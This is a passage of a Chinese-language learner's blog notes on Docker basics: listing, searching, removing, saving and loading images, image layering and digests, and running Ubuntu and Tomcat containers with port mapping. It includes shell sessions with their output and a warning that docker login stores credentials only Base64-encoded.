docker images --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br><span class="line">​</span><br><span class="line">List images</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image ls, docker image list, docker images</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all images (default hides intermediate images)</span><br><span class="line">      --digests         Show digests</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format</span><br><span class="line">                        with column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format</span><br><span class="line">                        using the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br><span class="line">  -q, --quiet           Only show image IDs</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>– digests可以查看镜像的摘要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --digests</span><br><span class="line">REPOSITORY    TAG       DIGEST                                                                    IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74   3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d   d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">centos        7         sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4   eeb6ee3f44bd   2 years ago     204MB</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>–no-trunc,写全信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --no-trunc</span><br><span class="line">REPOSITORY    TAG       IMAGE ID                                                                  CREATED         SIZE</span><br><span class="line">busybox       latest    sha256:3f57d9401f8d42f986df300f0c69192fc41da28ccc8d797829467780db3dd741   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a   10 months ago   13.3kB</span><br><span class="line">centos        7         sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9   2 years ago     204MB</span><br></pre></td></tr></table></figure><p>-q是显示简略信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images -q</span><br><span class="line">3f57d9401f8d</span><br><span class="line">d2c94e258dcb</span><br><span class="line">eeb6ee3f44bd</span><br></pre></td></tr></table></figure><p>docker rmi  $(docker images -q)删除所有镜像</p><p>但遇到一个问题”Error response from daemon: invalid reference format: repository name must be lowercase”但这个好像是要小写命名docker镜像</p><p>这个好像要重命名才能解决</p><p>docker images 镜像名字，单独查看那个镜像的信息</p><p>-f 过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images -f dangling=true --悬虚镜像：悬虚镜像就是镜像没有仓库名或没有标签查询显示虚悬镜像，在列表中展示为 &lt;none&gt;:&lt;none&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200412145250562.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-D5avIWwl-1586674340510)(evernotecid://621D2FF6-4E72-4E02-9043-55F31F42819B/appyinxiangcom/22553815/ENResource/p1118)]"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images -f since=hello-world</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br></pre></td></tr></table></figure><p>since这个是看自since之后的东西，也可以用before看之前的</p><p>reference&#x3D; * : * 宽泛查询，*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images -f reference=*:latest找所有latest版本的镜像</span><br><span class="line">docker images -f refernece=centos:*找所有版本的centos</span><br><span class="line">docker images -f reference=*t*找到名字和版本中包含字母t的镜像</span><br><span class="line">但reference只查官方的</span><br></pre></td></tr></table></figure><p>–format 格式化输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;</span><br><span class="line">busybox</span><br><span class="line">hello-world</span><br><span class="line">centos</span><br><span class="line">[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;:&#123;&#123;.Tag&#125;&#125;</span><br><span class="line">busybox:latest</span><br><span class="line">hello-world:latest</span><br><span class="line">centos:7</span><br></pre></td></tr></table></figure><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search centos</span><br><span class="line">NAME                               DESCRIPTION                                                                                                                   STARS     OFFICIAL</span><br><span class="line">centos                             DEPRECATED; The official build of CentOS.                                                                                     7715      [OK]</span><br><span class="line">kasmweb/centos-7-desktop           CentOS 7 desktop for Kasm Workspaces                                                                                          43</span><br><span class="line">...</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>AUTOMATED表示当前镜像是否是”自动化镜像“，就是使用Docker Hub连接一个包含Dockerfile文件（专门构建镜像用的文件）的GitHub仓库或Bitbucket仓库（源码托管平台），然后Docker Hub就会自动根据Dockerfile内容构建镜像，这种构建出的镜像就会带AUTOMATED，这种构建镜像的方式称为Trusted Build（受信构建）。只要Dockerfile文件内容发生变化，那么Docker Hub就会构建出新的镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search --help</span><br><span class="line"></span><br><span class="line">Usage:  docker search [OPTIONS] TERM</span><br><span class="line"></span><br><span class="line">Search Docker Hub for images</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided -f和之前的images差不多</span><br><span class="line">      --format string   Pretty-print search using a Go template</span><br><span class="line">      --limit int       Max number of search results-限制个数</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br></pre></td></tr></table></figure><h2 id="dockers-rmi-删除容器-rm"><a href="#dockers-rmi-删除容器-rm" class="headerlink" title="dockers rmi(删除容器 rm)"></a>dockers rmi(删除容器 rm)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">​</span><br><span class="line">Remove one or more images</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image rm, docker image remove, docker rmi</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -f, --force      Force removal of the image --强制删除</span><br><span class="line">      --no-prune   Do not delete untagged parents --和镜像层相关</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>操作一下试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">centos        7         eeb6ee3f44bd   2 years ago     204MB</span><br><span class="line">[root@localhost ~]# docker rmi centos:7</span><br><span class="line">Untagged: centos:7</span><br><span class="line">Untagged: centos@sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4</span><br><span class="line">Deleted: sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9</span><br><span class="line">Deleted: sha256:174f5685490326fc0a1c0f5570b8663732189b327007e47ff13d2ca59673db02</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">[root@localhost ~]# docker rmi hello-world</span><br><span class="line">Error response from daemon: conflict: unable to remove repository reference &quot;hello-world&quot; (must force) - container 9c54e5ac2981 is using its referenced image d2c94e258dcb</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED        STATUS                    PORTS     NAMES</span><br><span class="line">9c54e5ac2981   hello-world   &quot;/hello&quot;   6 hours ago    Exited (0) 6 hours ago              ecstatic_ride</span><br><span class="line">0881099d27ad   hello-world   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock</span><br><span class="line">[root@localhost ~]# docker rmi -f hello-world</span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d</span><br><span class="line">Deleted: sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND    CREATED        STATUS                    PORTS     NAMES</span><br><span class="line">9c54e5ac2981   d2c94e258dcb   &quot;/hello&quot;   7 hours ago    Exited (0) 7 hours ago              ecstatic_ride</span><br><span class="line">0881099d27ad   d2c94e258dcb   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br></pre></td></tr></table></figure><p>其中hello-world因为已经运行在容器里了，可以ps -a一下看看，然后用-f强制删除</p><h2 id="docker-save"><a href="#docker-save" class="headerlink" title="docker save"></a>docker save</h2><p>用来把镜像打包保存到本体，方变移动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">zookeeper    3.7       446078172ae8   2 weeks ago   307MB</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br><span class="line">[root@localhost ~]# docker save --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker save [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">​</span><br><span class="line">Save one or more images to a tar archive (streamed to STDOUT by default)</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image save, docker save</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -o, --output string   Write to a file, instead of STDOUT</span><br><span class="line">[root@localhost ~]# docker save -o my.tar zookeeper:3.7 busybox:latest</span><br><span class="line">[root@localhost ~]# ll</span><br><span class="line">total 310364</span><br><span class="line">...</span><br><span class="line">-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar</span><br><span class="line">...</span><br><span class="line">也可以重定向到一个文件里，用&gt;</span><br><span class="line">​</span><br><span class="line">[root@localhost ~]# docker save zookeeper:3.7 busybox:latest &gt; new.tar</span><br><span class="line">[root@localhost ~]# ll</span><br><span class="line">total 620696</span><br><span class="line">...</span><br><span class="line">-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar</span><br><span class="line">-rw-r--r--. 1 root root 317776384 Mar  1 04:03 new.tar</span><br><span class="line">...大小都是一样得</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301200411484.png" alt="image-20240301200411484"></p><p>这是原来的，然后把它们删除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi 446078172ae8 3f57d9401f8d</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID   CREATED   SIZE</span><br></pre></td></tr></table></figure><p>然后再把tar加载出来</p><h2 id="docker-load"><a href="#docker-load" class="headerlink" title="docker load"></a>docker load</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker load --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker load [OPTIONS]</span><br><span class="line">​</span><br><span class="line">Load an image from a tar archive or STDIN</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image load, docker load</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -i, --input string   Read from tar archive file, instead of STDIN</span><br><span class="line">  -q, --quiet          Suppress the load output</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker load -i my.tar</span><br><span class="line">2e112031b4b9: Loading layer  4.492MB/4.492MB</span><br><span class="line">Loaded image: busybox:latest</span><br><span class="line">d101c9453715: Loading layer  80.41MB/80.41MB</span><br><span class="line">431a6830edc6: Loading layer  38.53MB/38.53MB</span><br><span class="line">c5da6d3a7681: Loading layer  140.9MB/140.9MB</span><br><span class="line">48ea7a659f10: Loading layer   2.56kB/2.56kB</span><br><span class="line">da0e0faf395b: Loading layer  3.072kB/3.072kB</span><br><span class="line">fb2a43f5cc59: Loading layer  342.5kB/342.5kB</span><br><span class="line">adff97f6861e: Loading layer  10.88MB/10.88MB</span><br><span class="line">9b43d841bc28: Loading layer  42.15MB/42.15MB</span><br><span class="line">9abd5b933e89: Loading layer  3.072kB/3.072kB</span><br><span class="line">Loaded image: zookeeper:3.7</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240301200729066.png" alt="image-20240301200729066"></p><p>和之前对比一下，镜像id都是一样的，这个也有重定向的写法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load &lt; my.tar</span><br></pre></td></tr></table></figure><p>效果是一样的</p><h2 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h2><p>Docker 镜像由一些<strong>松耦</strong>合的只读镜像层组成，Docker Daemon 负责堆叠这些镜像层，并将它们关联为一个统一的整体，即对外表现出的是一个独立的对象。“通过 docker pull 命令拉取指定的镜像时,每个 Pull complete 结尾的行就代表下载完毕了一个镜像层。·<br>例如，下面的 redis:latest 镜像就包含8个镜像层。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull redis</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/redis</span><br><span class="line">e1caac4eb9d2: Pull complete</span><br><span class="line">7469c6c5b625: Pull complete</span><br><span class="line">a3d1b68c4a62: Pull complete</span><br><span class="line">152cbe749752: Pull complete</span><br><span class="line">7218480dfba1: Pull complete</span><br><span class="line">e61c48a0d344: Pull complete</span><br><span class="line">4f4fb700ef54: Pull complete</span><br><span class="line">82adb0efabd8: Pull complete</span><br><span class="line">--如果存在则会显示Already exists</span><br><span class="line">Digest: sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402</span><br><span class="line">Status: Downloaded newer image for redis:latest</span><br><span class="line">docker.io/library/redis:latest</span><br></pre></td></tr></table></figure><h3 id="为什么分层"><a href="#为什么分层" class="headerlink" title="为什么分层"></a>为什么分层</h3><p>采用这种分层结构的优势很多，例如，每个分层都是只读的，所有对分层的修改都是以新分层的形式出现，并不会破坏原分层内容:再如，每个分层只记录变更内容，所以有利于节省存储空间等。”<br>不过，分层结构的最大的好处是，在不同镜像间实现<strong>资源共享</strong>，即不同镜像对相同下层镜像的复用。对于 docker pull 命令,其在拉取之前会先获取到其要拉取镜像的所有 magelD,然后在本地查找是否存在这些分层。如果存在，则不再进行拉取，而是共享本地的该分层。大大节点的存储空间与网络带宽，提升了拉取效率。</p><h3 id="镜像层构成"><a href="#镜像层构成" class="headerlink" title="镜像层构成"></a>镜像层构成</h3><p>每个镜像层由两部分构成:<strong>镜像文件系统</strong>与<strong>镜像json</strong> 文件。这两部分具有相同的 magelD.镜像文件系统就是对镜像占有的磁盘空间进行管理的文件系统,拥有该镜像所有镜像层的数据内容。而镜像 json 文件则是用于描述镜像的相关属性的集合，通过 docker inspect [镜像]就可以直观看到。“</p><h4 id="镜像文件系统构成"><a href="#镜像文件系统构成" class="headerlink" title="镜像文件系统构成"></a>镜像文件系统构成</h4><p>一个 docker 镜像的文件系统由多层只读的镜像层组成，每层都完成了特定的功能而这些只读镜像层根据其位置与功能的不同可分为两类: <strong>基础镜像层</strong>与<strong>扩展镜像层.</strong><img src="/../image/image-20240302143631410.png" alt="image-20240302143631410"></p><ul><li>基础镜像层</li></ul><p>​所有镜像的最下层都具有一个可以<strong>看得到</strong>的基础镜像层 Base lmage,基础镜像层的文件系统称为根文件系统 rootfs。而 rootfs 则是建立在 Linux 系统中“<strong>看不到的</strong>”引导文件系统bootfs之上。</p><ul><li>扩展镜像层</li></ul><p>​在基础镜像层之上的镜像层称为扩展镜像层。顾名思义,其是对基础镜像层功能的扩展在 Dockerfile 中，每条指令都是用于完成某项特定功能的，而每条指令都会生成一个扩展镜像层。“</p><ul><li>容器层</li></ul><p>​一旦镜像运行了起来就形成了容器，而容器就是一个运行中的 Linux 系统，其也是具有文件系统的。容器的这个文件系统是在 docker 镜像<strong>最外层</strong>之上增加了一个<strong>可读写的容器层</strong>对文件的任何更改都只存在于容器层。因此任何对容器的操作都不会影响到镜像本身。“容器层如果需要修改某个文件，系统会从容器层开始向下一层层的查找该文件，直到找到为止。任何对于文件的操作都会记录在容器层。例如，要修改某文件，容器层会首先把在镜像层找到的文件 copy 到容器层，然后再进行修改。删除文件也只会将存在于容器层中的文件副本删除。“<br>​可以看出,Docker 容器就是一个叠加后的文件系统,而这个容器层称为 Union File System,联合文件系统。</p><h2 id="LinuxOS启动过程"><a href="#LinuxOS启动过程" class="headerlink" title="LinuxOS启动过程"></a>LinuxOS启动过程</h2><p>​现代操作系统都是 C&#x2F;S模式的微内核架构的，由两大部分构成:内核(Server)与服务模块(Client)。</p><p>​Linux的 bootfs 文件系统由两部分构成:bootloader（将kernel加载到内存，并引导kernel启动） 与kernel（启动后，内存使用权就又bootfs完全转交给kernel，然后kernel就会把bootfs卸载）。</p><p><img src="/../image/image-20240302163101380.png" alt="image-20240302163101380"></p><h2 id="镜像摘要"><a href="#镜像摘要" class="headerlink" title="镜像摘要"></a>镜像摘要</h2><p>每个镜像都有一个长度为64 位的16 进制字符串作为其摘要 digest。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect [OPTIONS] NAME|ID [NAME|ID...]</span><br></pre></td></tr></table></figure><p>OPTIONS说明：</p><ul><li>**-f :**指定返回值的模板文件。</li><li>**-s :**显示总的文件大小。</li><li>**–type :**为指定类型返回JSON。</li></ul><p>查看摘要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images xx --degists</span><br><span class="line">[root@localhost ~]# docker images redis --digests</span><br><span class="line">REPOSITORY   TAG       DIGEST                                                                    IMAGE ID       CREATED       SIZE</span><br><span class="line">redis        latest    sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402   d1397258b209   7 weeks ago   138MB</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>一个镜像一旦创建完毕，其 digest 就不会发生改变了，因为镜像是只读的。。<br>Docker 默认采用的 Hash 算法是 SHA256，即 Hah 值是一个长度为 256 位的二进制值。<br>Docker 使用 16 进制表示，即变为了长度为 64 位的字符串。</p><h3 id="摘要作用"><a href="#摘要作用" class="headerlink" title="摘要作用"></a>摘要作用</h3><p>​摘要的主要作用是区分相同<repository>:<tag>的不同镜像。。<br>​例如镜像 xxx:2.8 在生产运行过程中发现存在一个 BUG。现对其进行了修复，并使用原标签将其 push 回了仓库，那么原镜像被覆盖。但生产环境中遗留了大量运行中的修复前镜像的容器。此时，通过镜像标签已经无法区分镜像是修复前的还是修复后的了，因为它们的标签是相同的。此时通过查看镜像的 digest 就可以区分出修改前后版本，因为内容发生了变化，digest一定会变。”<br>​为了确保再次拉取到的是修复后的镜像，可通过 digest 进行镜像拉取。其用法是:docker pull <repository>@<digest>.</p><h3 id="分发散列值"><a href="#分发散列值" class="headerlink" title="分发散列值"></a>分发散列值</h3><p>​在 push 或 pul 镜像时，都会对镜像进行压缩以减少网络带宽和传输时长。但压缩会改变镜像内容，会导致经过网络传输后，镜像内容与其digest不相符。出现问题。<br>​为了避免该问题该问题，Docker 又为镜像配置了 Distribution Hash(分发散列值)。在镜像被压缩后立即计算分发散列值，然后使该值随压缩过的镜像一同进行发送。在接收方接收后，立即计算压缩镜像的分发散列值，再与携带的分发散列值对比。如果相同，则说明传输没有问题。</p><h2 id="容器运行的本质"><a href="#容器运行的本质" class="headerlink" title="容器运行的本质"></a>容器运行的本质</h2><p>Docker 容器存在的意义就是为了运行容器中的应用，对外提供服务，所以启动容器的目的就是启动运行该容器中的应用。容器中的应用运行完毕后，容器就会自动终止。所以，如果不想让容器启动后立即终止运行，则就需要使容器应用不能立即结束。通常采用的方式有两种，使应用处于<strong>与用户交互</strong>的状态或<strong>等待状态</strong>。.</p><h3 id="docker交互式启动ubantu"><a href="#docker交互式启动ubantu" class="headerlink" title="docker交互式启动ubantu"></a>docker交互式启动ubantu</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull ubuntu</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">01007420e9b0: Pull complete</span><br><span class="line">Digest: sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0da</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">docker.io/library/ubuntu:latest</span><br></pre></td></tr></table></figure><h4 id="遇到问题Error-docker-login—"><a href="#遇到问题Error-docker-login—" class="headerlink" title="遇到问题Error docker login—-"></a>遇到问题Error docker login—-</h4><p>Error response from daemon: pull access denied for ubantu, repository does not e                                                                              xist or may require ‘docker login’: denied: requested access to the resource is                                                                               denied</p><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">然后输入你的账号密码</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>密码会保存在&#x2F;root&#x2F;.docker&#x2F;config.json文件下，要注意保护，加密方式是Base64，解码出来时账号:密码的格式，还是挺危险的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# echo &quot;YWRtaW46MTIzNDU2==&quot; | base64 --decode</span><br><span class="line">admin:123456 base64: invalid input</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name myubantu ubantu #--name重命名方便查询进程</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND       CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">6bb10ad29613   ubuntu         &quot;/bin/bash&quot;   4 seconds ago    Exited (0) 3 seconds ago              myubuntu</span><br></pre></td></tr></table></figure><p>可以发现是退出的状态，所以我们需要加上一个bash来添加命令行，然后容器里不允许重名，所以–name 后可以加个2，</p><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li>**ubuntu这是指用 ubuntu镜像为基础来启动容器。</li><li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mybantu2 -it ubuntu /bin/bash #-i是交互式命令，-t是给一个伪客户端， /bin/bash是常用shell的路径</span><br><span class="line">[root@localhost ~]# docker run --name mybuntu2 -it ubuntu /bin/bash</span><br><span class="line">root@939a1dcb875c:/# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure><p>可以看到这就进来了，但有很多命令这个系统里是没有，然后可以按exit退出</p><p>但有时候这个&#x2F;bin&#x2F;bash也可以不加，不懂什么时候要什么时候不要</p><ul><li>原因：可以看dockerfile里的镜像层，有一个CMD[‘bash’],是作为run参数里的一个选项，没有的话默认就是bash</li></ul><h3 id="docker交互式启动tomcat"><a href="#docker交互式启动tomcat" class="headerlink" title="docker交互式启动tomcat"></a>docker交互式启动tomcat</h3><p>与ubuntu不同的是，tomcat启动时需要注意一些东西，这里就不用最新版了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:8.5.49</span><br><span class="line">[root@localhost ~]# docker run --name mytom -it tomcat:8.5.49 /bin/bash</span><br><span class="line">root@df72620e3480:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps</span><br></pre></td></tr></table></figure><p>可以发现和解压出来的一样，但tomcat是未启动，原因出在&#x2F;bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mytom2 -it tomcat:8.5.49</span><br><span class="line">...</span><br><span class="line">Server startup in 888 ms</span><br></pre></td></tr></table></figure><p>这时候会发现tomcat启动了，用网页访问试试,还是不行，因为端口8080是centos的里某个占用这个端口的应用，但此时没有，所以不行，需要用到端口映射，把它暴露给宿主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mytom3 -it -p 8081:8080 tomcat:8.5.49  左边是宿主机的端口，右边是容器里的端口</span><br><span class="line">第一个8081是暴露linux 的端口号，这样外部才能连接linux</span><br><span class="line">第二个端口号暴露的是容器的端口号，这样linux才能连接容器</span><br><span class="line">-P是随机分配到默认即 rand:default 因为不可控，所以不常用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是-p这个参数要放在容器左边，不然会出问题，但视频里可以访问，我的不知道为什么，虚拟机里可以访问，但自己的windows主机访问不了</p><h4 id="遇到问题网络没了"><a href="#遇到问题网络没了" class="headerlink" title="遇到问题网络没了"></a>遇到问题网络没了</h4><ul><li><a href="https://zhuanlan.zhihu.com/p/426926356">解决方法</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list --看看配置里是否有网络管理工具冲突，保留一个即可</span><br><span class="line">systemctl stop NetworkManager</span><br><span class="line">systemctl restart Network.Service</span><br></pre></td></tr></table></figure><ul><li>docker ps -a的内容太多</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -a -q) 删除所有已经停止的容器</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240303135819090.png" alt="image-20240303135819090"></p><p>终于是进来了，有两种退出方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + p + q容器还是up的</span><br><span class="line">ctrl + c 就直接退出了</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS         PORTS                                       NAMES</span><br><span class="line">b162037cb017   tomcat:8.5.49   &quot;catalina.sh run&quot;   7 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   tom1</span><br></pre></td></tr></table></figure><p>这里可以发现 command就不是&#x2F;bin&#x2F;bash了，俄式一个.sh文件</p><p>tips：0.0.0.0 ipv4的任意ip   ::: ipv6的任意ip</p><h3 id="守护进程方式启动tomcat"><a href="#守护进程方式启动tomcat" class="headerlink" title="守护进程方式启动tomcat"></a>守护进程方式启动tomcat</h3><p>但如果伪终端一直存在，对后续的操作并不是很方便，所以我们可以把-it参数换成-d</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name tom2 -dp 8081:8080 tomcat:8.5.49</span><br><span class="line">e37ef6eeb57e3ef728d06c3807ace699a4292266fe8b295f384a04afc4e28c93</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240303141539414.png" alt="image-20240303141539414"></p><p>可以看到8081也是可以访问的，但以此方式启动ubuntu是退出状态，因为未提供可交互的平台，当我们不知道时，可以看该镜像的dockerfile，里面会告诉我们要不要写。</p><h3 id="对高版本的tomcat的访问"><a href="#对高版本的tomcat的访问" class="headerlink" title="对高版本的tomcat的访问"></a>对高版本的tomcat的访问</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:8.5.50</span><br><span class="line">docker run --name tom3 -dp 8084:8080 tomcat:8.5.50</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240303151123587.png" alt="image-20240303151123587"></p><p>服务启动了，但没找到资源，说不定是网站页面文件配置有问题，所以我们进入tomcat的文件里看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name tom4 -it tomcat:8.5.50 /bin/bash --这里就不用-p参数了，因为访问不了，只是看看配置文件</span><br><span class="line">root@48c67ba22d08:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     README.md      conf     native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  RELEASE-NOTES  include  temp</span><br><span class="line">LICENSE          RUNNING.txt    lib      webapps</span><br><span class="line">NOTICE           bin            logs     